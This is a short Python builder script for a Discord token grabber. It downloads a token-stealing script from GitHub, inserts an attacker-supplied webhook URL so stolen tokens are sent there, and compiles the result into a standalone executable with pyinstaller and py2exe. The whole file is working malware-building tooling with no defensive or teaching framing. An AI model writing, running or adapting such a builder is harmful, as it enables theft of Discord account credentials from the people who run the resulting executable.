import os
from colored import fg
import requests

def py2exee():
    os.system("python grabber.py py2exe")
def createfile():
    startfilereq = requests.get("https://raw.githubusercontent.com/wodxgod/Discord-Token-Grabber/master/token-grabber.py")
    file = open("grabber.py", "w")
    file.write(startfilereq.text)



createfile()
webhook = input("Webhook >>")

with open('grabber.py', 'r') as file:
    filedata = file.read()

# Replace the target string
filedata = filedata.replace("WEBHOOK HERE", str(webhook))

# Write the file out again
with open('grabber.py', 'w') as file:
    file.write(filedata)

os.system("pip install pyinstaller")
os.system("pyinstaller --onefile --icon=icon.ico grabber.py")
exec(open("py2exe.bat").read())
py2exee()
